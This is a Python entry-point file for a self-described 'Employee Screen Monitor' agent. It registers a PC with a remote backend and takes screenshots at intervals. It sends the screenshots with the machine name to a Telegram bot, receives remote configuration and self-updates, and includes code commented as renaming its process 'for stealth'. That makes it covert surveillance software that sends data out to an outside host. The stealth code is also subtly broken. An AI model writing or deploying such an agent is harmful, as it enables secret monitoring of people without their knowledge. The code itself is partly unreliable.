# main.py — Core agent entry point and main loop.

import os
import sys
import time
import json
import logging
import requests
from pathlib import Path
from datetime import datetime

# Import local modules
from constants import BACKEND_URL, DEFAULT_INTERVAL_MINUTES, PROCESS_NAME, APP_DATA_DIR, CLIENT_ID_FILE
from local_config import LocalConfig
from screenshot import ScreenshotManager
from sender import TelegramSender
from config_poller import ConfigPoller
from heartbeat import HeartbeatManager
from updater import Updater

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(APP_DATA_DIR, 'agent.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Rename process for stealth
if hasattr(os, 'rename'):
    original_name = sys.argv[0]
    try:
        # Attempt to rename the process image
        import psutil
        process = psutil.Process()
        process.name = PROCESS_NAME
    except Exception as e:
        logger.debug(f'Failed to rename process: {e}')

class Agent:
    def __init__(self):
        self.client_id = None
        self.config = {
            'interval_minutes': DEFAULT_INTERVAL_MINUTES,
            'bot_token': '',
            'chat_id': '',
            'send_enabled': False,
            'is_active': True,
        }
        self.screenshot_enabled = True
        self.screenshot_manager = ScreenshotManager()
        self.local_config = LocalConfig()
        self.heartbeat_manager = None
        self.config_poller = None
        self.updater = None
        self.sender = None

    def setup(self):
        """Initialize agent components and register with backend."""
        logger.info('Initializing Employee Screen Monitor agent...')

        # Load or create client ID
        self.client_id = self.local_config.get_or_create_client_id()
        logger.info(f'Agent client ID: {self.client_id}')

        # Register with backend (first run only)
        self._register_with_backend()

        # Load initial configuration from backend
        self._load_config()

        # Initialize components
        self.heartbeat_manager = HeartbeatManager(self.client_id, BACKEND_URL)
        self.config_poller = ConfigPoller(self.client_id, BACKEND_URL, self._on_config_update)
        self.updater = Updater(
            current_version='1.0.0',
            backend_url=BACKEND_URL,
            executable_path=sys.executable,
            client_id=self.client_id
        )

        if self.config['bot_token'] and self.config['chat_id']:
            self.sender = TelegramSender(self.config['bot_token'], self.config['chat_id'])

        # Start background services
        self.heartbeat_manager.start()
        self.config_poller.start()
        self.updater.start()

        logger.info('Agent setup completed successfully')

    def _register_with_backend(self):
        """Register this client with the backend to receive a client ID."""
        try:
            # Check if already registered locally
            if os.path.exists(CLIENT_ID_FILE):
                logger.info('Client already registered')
                return

            logger.info('Registering with backend...')
            url = f'{BACKEND_URL}/register'
            payload = {
                'pc_name': os.environ.get('COMPUTERNAME', 'Unknown'),
                'ip_address': '192.168.1.1',  # TODO: Replace with actual IP if needed
                'os_version': 'Windows 11 Pro',
                'agent_version': '1.0.0',
            }
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                self.client_id = data.get('client_id')
                # Save client ID locally
                self.local_config.client_id_file.write_text(self.client_id)
                logger.info(f'Registered with client ID: {self.client_id}')
            else:
                logger.error(f'Failed to register with backend. Status code: {response.status_code}, Response: {response.text}')
        except Exception as e:
            logger.error(f'Error registering with backend: {e}')

    def _load_config(self):
        """Load initial configuration from backend."""
        try:
            url = f'{BACKEND_URL}/config/{self.client_id}'
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                config = response.json()
                self.config.update(config)
                logger.info(f'Configuration loaded: {self.config}')
            else:
                logger.warning(f'Failed to load configuration. Status code: {response.status_code}, Response: {response.text}')
        except Exception as e:
            logger.error(f'Error loading configuration: {e}')

    def _on_config_update(self, new_config: dict):
        """Callback for configuration updates from backend."""
        logger.info(f'Configuration updated: {new_config}')
        self.config.update(new_config)
        # Re-initialize Telegram sender if bot token or chat ID changed
        if self.config['bot_token'] and self.config['chat_id'] and (not self.sender or self.sender.bot_token != self.config['bot_token'] or self.sender.chat_id != self.config['chat_id']):
            self.sender = TelegramSender(self.config['bot_token'], self.config['chat_id'])
        # Log interval change
        if 'interval_minutes' in new_config:
            logger.info(f'Screenshot interval updated to {self.config["interval_minutes"]} minutes')

    def run(self):
        """Main agent loop."""
        self.setup()
        logger.info('Starting main loop...')

        try:
            while True:
                if not self.screenshot_enabled or not self.config.get('is_active'):
                    time.sleep(60)
                    continue

                interval = self.config.get('interval_minutes', DEFAULT_INTERVAL_MINUTES) * 60
                logger.info(f'Next screenshot in {interval} seconds')

                # Capture screenshot
                try:
                    screenshot_path = self.screenshot_manager.capture_screenshot()

                    # Send to Telegram if configured and enabled
                    if self.config['send_enabled'] and self.sender:
                        caption = f'PC: {os.environ.get("COMPUTERNAME", "Unknown")} | Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
                        success = self.sender.send_screenshot(screenshot_path, caption)
                        if success:
                            logger.info(f'Screenshot sent successfully to Telegram')
                        else:
                            logger.error(f'Failed to send screenshot to Telegram')
                    else:
                        logger.info(f'Screenshot captured but not sent (send_enabled: {self.config["send_enabled"]})')

                except Exception as e:
                    logger.error(f'Error during screenshot capture: {e}')

                # Wait for next interval
                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info('Agent stopped by user')
        except Exception as e:
            logger.error(f'Unexpected error: {e}')
        finally:
            self._cleanup()

    def _cleanup(self):
        """Cleanup before exiting."""
        logger.info('Cleaning up...')
        if self.heartbeat_manager:
            self.heartbeat_manager.stop()
        if self.config_poller:
            self.config_poller.stop()
        if self.updater:
            self.updater.stop()
        logger.info('Cleanup completed')

if __name__ == '__main__':
    try:
        agent = Agent()
        agent.run()
    except Exception as e:
        logger.error(f'Fatal error: {e}')
        sys.exit(1)